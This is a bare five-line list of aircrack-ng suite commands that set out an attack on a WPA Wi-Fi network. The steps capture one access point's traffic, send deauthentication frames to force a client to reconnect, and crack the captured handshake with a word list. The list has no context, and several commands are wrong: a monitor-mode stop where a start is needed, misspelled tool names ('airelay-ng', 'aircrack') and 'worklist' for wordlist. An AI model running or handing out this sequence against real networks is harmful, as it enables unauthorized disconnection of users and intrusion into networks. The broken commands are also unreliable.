airmon-ng stop wlan0
airodump-ng wlan0
airodump-ng -c 8 --write file --bssid bssid wlan0
airelay-ng --deauth 5 -a bssid -c hacker wlan0
aircrack -w worklist -b bssid filecap